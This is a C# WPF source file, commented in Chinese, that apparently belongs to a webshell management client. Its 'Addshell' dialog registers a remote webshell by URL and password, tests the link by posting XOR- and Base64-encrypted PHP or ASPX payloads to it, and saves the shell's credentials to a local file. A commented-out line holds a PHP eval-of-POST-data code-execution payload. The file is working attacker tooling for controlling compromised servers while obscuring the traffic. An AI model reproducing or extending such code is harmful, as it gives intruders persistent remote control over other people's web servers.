using System;
using System.Collections.Generic;
using System.Windows;
using WpfApp1.Utli;
using System.IO;
using WpfApp1.Payload.php;
using WpfApp1.Payload.aspx;
using WpfApp1.Payload.php.xor;
using System.Windows.Forms;

namespace WpfApp1.UI
{
    /// <summary>
    /// Addshell.xaml 的交互逻辑
    /// </summary>
    public partial class Addshell : Window
    {
        
   
        public Addshell()
        {
            InitializeComponent();
        }
        //存放shell链接的变量
        public string? Url { get; set; }
        //密码
        public string? pwd { get; set; }

        //
        public string? Fopn { get; set; }

        public string? Des { get; set; }

        /// <summary>
        /// 引入php payload
        /// </summary>
        Controller payload = new Controller();
        Info Info = new Info();

        /// <summary>
        /// 引入aspx payload
        /// </summary>
        Base Base = new Base();

        /// <summary>
        /// 列表id
        /// </summary>
        public string? ID { get; set; }

        //生成随机数 从 1 开始
        number num = new number();

       

        /// <summary>
        /// 测试是否通信按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Button_Click(object sender, RoutedEventArgs e)
        {
            Url = url.Text;
            pwd=  Password.Text;

            if (url.Text == String.Empty)
            {
                System.Windows.MessageBox.Show("连接地址不能为空！");
            }
            else if (Password.Text == String.Empty)
            {
                System.Windows.MessageBox.Show("连接密码不能为空！");
            }
            else if (def.Text == String.Empty)
            {
                System.Windows.MessageBox.Show("分类不能为空！");
            }
            else if (combox1.Text == String.Empty)
            {
                System.Windows.MessageBox.Show("编码不能为空！");
            }
            else if (combox2.Text == String.Empty)
            {
                System.Windows.MessageBox.Show("脚本类型不能为空！");
            }
            else
            {
                if (combox1.Text == "Base64加密")
                {
                    if(combox2.Text == "php")
                    {
                        /*string z1 = "@eval(base64_decode($_POST['z1']));";
                        string info = payload.info();
                        string p = z1 + "&z1=" + info;
                        string rsults = Post.Postring(Url, new Dictionary<string, string> { { pwd, p }, });*/
                        string pay = Info.info();
                        string xor_base64_encrypt = Utli.xor_base64.Encrypt(pay);
                        string resp = Utli.XorPost.Post(Url, xor_base64_encrypt);
                        string xor_base64_decrypt = Utli.xor_base64.Decrypt(resp);

                        if (xor_base64_decrypt == "1")
                        {
                            System.Windows.MessageBox.Show("连接成功！");
                        }
                        else
                        {
                            System.Windows.MessageBox.Show("连接失败！");
                        }
                    }
                    if(combox2.Text == "aspx")
                    {
                        string p = Base.info();
                        string rsults = Post.Postring(Url, new Dictionary<string, string> { { pwd, p }, });

                        if(rsults.Contains("C:\\") ==true)
                        {
                            System.Windows.MessageBox.Show("连接成功！");
                        }
                        else
                        {
                            System.Windows.MessageBox.Show("连接失败！");
                        }

                    }
                   
                }
                else 
                {
                    System.Windows.MessageBox.Show("加密方式选择错误！");
                }
            }

            

        }
        /// <summary>
        /// 保存按钮
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private  void Button_Click_1(object sender, RoutedEventArgs e)
        {
           
            try
            {

                Url = url.Text;
                pwd = Password.Text;
                Des = def.Text;
                ID = num.GetDom();
                if (url.Text == String.Empty)
                {
                    System.Windows.MessageBox.Show("连接地址不能为空！");
                }else if(Password.Text == String.Empty)
                {
                    System.Windows.MessageBox.Show("连接密码不能为空！");
                }else if(def.Text == String.Empty)
                {
                    System.Windows.MessageBox.Show("分类不能为空！");
                }else if(combox1.Text == String.Empty)
                {
                    System.Windows.MessageBox.Show("编码不能为空！");
                }else if(combox2.Text == String.Empty)
                {
                    System.Windows.MessageBox.Show("脚本类型不能为空！");
                }
                else
                {
                    string Fopen = String.Format("{{\"ID\":\"{0}\",\"url\": \"{1}\",\"password\": \"{2}\",\"encode\": \"{3}\",\"script\":\"{4}\",\"defaults\":\"{5}\"}}", ID, Url, pwd, combox1.Text, combox2.Text, Des);
                    //await File.WriteAllTextAsync("WriteText.txt", Fopen);

                    File.AppendAllText(@"Data/ant.txt", Fopen + Environment.NewLine);
                    System.Windows.MessageBox.Show("保存成功！");

                }
                this.Close();

                
               
            }
            catch
            {
                System.Windows.MessageBox.Show("保存失败！");
            }
        }
    }
}
